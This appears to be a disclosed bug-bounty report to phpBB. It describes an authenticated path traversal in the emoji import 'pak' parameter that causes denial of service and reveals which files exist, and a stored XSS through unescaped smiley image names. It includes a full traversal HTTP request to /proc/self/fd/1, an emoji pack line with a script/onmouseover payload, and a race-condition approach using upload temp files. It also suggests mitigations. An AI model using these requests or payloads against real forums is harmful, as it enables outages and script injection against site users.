# Authenticated path traversal to Stored XSS and Denial-of-Service

## Report Details
- **Report ID**: 2168002
- **URL**: https://hackerone.com/reports/2168002
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2023-09-17T15:20:56.459Z
- **Disclosed**: 2023-10-29T20:51:20.987Z

## Reporter
- **Username**: shin24
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: phpbb

## Vulnerability Information
# Denial-of-Service
The vulnerabiity lies on the line `552` of `acp_icons.php`file, when importing emoji from a file we can tell phpBB which file to import from via the paramter `pak`, without any sanitization, the `pak` paramter gets passed dirrectly to `file` the file function, which attemp to read the content of the file to an array.
{F2705838}
Because of the check, reading files like /etc/passwd would not be possible, but if we try to read files like /proc/self/fd/1, the request will hang, a TCP connection will be kept open, the will bring lots of burden to the server. More over, in the case when phpBB is behind a proxy, which may process concurrent request one by one, in this case, if the previous request has not finished, the the rest of requests will have to wait for it to timeout, causing a Denial-of-Service

In the progress of testing, i use the default HTTP server of PHP, which simulate exactly what a one-by-one request processing proxy would do.
Request:
```
POST /adm/index.php?i=acp_icons&mode=smilies&current=delete HTTP/1.1
Host: 127.0.0.1:8082
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Content-Type: application/x-www-form-urlencoded
Referer: http://127.0.0.1:8082/adm/index.php?i=acp_icons&mode=smilies
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: csrftoken=Ky6rB5uThxl3PwYd6EScmT9WXYiH6rGe; sessionid=hmrhwwo5hj5abu4kqgln2let1x9zudbr; phpbb3_83bmg_u=2; phpbb3_83bmg_k=zalvonnyh1lr16og; phpbb3_83bmg_sid=3ba797a8668f6db1639ac6939d91f96e
Connection: close
Content-Length: 137

action=import&pak=../../../../../../../../../proc/self/fd/1&form_token=b2655d5f0c9edb201328b799a61777b26cef16a5&creation_time=1694960302
```
Result timed-out and no response received:
{F2705858}

This vulnerability can also help an authenticated attacker know which file exist on server by observe the response message, if the file is not found, the error from `$user->lang['PAK_FILE_NOT_READABLE']` would trigger and result in different message than `$user->lang['WRONG_PAK_TYPE']`(when the file exist but has invalid format)
# Stored XSS
When testing the emoji import, i also observe that the `SMILEY_IMG` isn't sanitized or escaped
{F2705870} 
So we can import a malicious emoji file containing the XSS payload, everyone who access the sites (posting section, comment section, admin section, ...) that emoji presents will trigger the XSS payload, leading to web defacement, cookie stealing, malware attack, ... 
```
'icon_e_biggrin.gif', '15', '17', '1', 'Very Happy', ':D',
'icon_e_biggrin.gif', '15', '17', '1', 'Very Happy', ':-D',
'icon_e_biggrin.gif', '15', '17', '1', 'Very Happy', ':grin:',
'icon_e_smile.gif', '15', '17', '1', 'Smile', ':)',
'icon_e_smile.gif', '15', '17', '1', 'Smile', ':-)',
'icon_e_smile.gif', '15', '17', '1', 'Smile', ':smile:',
'icon_e_wink.gif', '15', '17', '1', 'Wink', ';)',
'icon_e_wink.gif', '15', '17', '1', 'Wink', ';-)',
'icon_e_wink.gif', '15', '17', '1', 'Wink', ':wink:',
'icon_e_sad.gif', '15', '17', '1', 'Sad', ':(',
'icon_e_sad.gif', '15', '17', '1', 'Sad', ':-(',
'icon_e_sad.gif', '15', '17', '1', 'Sad', ':sad:',
'icon_e_surprised.gif', '15', '17', '1', 'Surprised', ':o',
'icon_e_surprised.gif', '15', '17', '1', 'Surprised', ':-o',
'icon_e_surprised.gif', '15', '17', '1', 'Surprised', ':eek:',
'icon_eek.gif', '15', '17', '1', 'Shocked', ':shock:',
'icon_e_confused.gif', '15', '17', '1', 'Confused', ':?',
'icon_e_confused.gif', '15', '17', '1', 'Confused', ':-?',
'icon_e_confused.gif', '15', '17', '1', 'Confused', ':???:',
'"onmouseover=alert() ><script>alert()</script>', '17', '18', '1', 'POC', ':POC:',
```
The problem is, if the attacker has no file access permission, how would he be able to import emoji from files? In here, i abused the function of PHP that it will create an tmp file in /tmp and has an file descriptor pointing at it (in my case was /proc/self/fd/10) when php process an uploading, then we will spam a lot of upload attachment request and in the same time, use race condition to import the file before it's deleted. Below i record a short video, spaming the upload request and use a small php file which emulate the behavior of the import function for demonstration purpose, i would be quite the same with the real function but if i turn on to many tab for race condition and also the recorder, i laptop will explose...

{F2705889}

The final result:
{F2705893}

## Impact

The impact for both DoS and XSS has been mentioned above

# Mitigation
I suggest HTML entity encoding data from emoji before show to client, limiting the folder of which user can import the emoji from.

## Attachments
- image.png
- image.png
- image.png
- 2023-09-17_22-09-28.mkv
- image.png
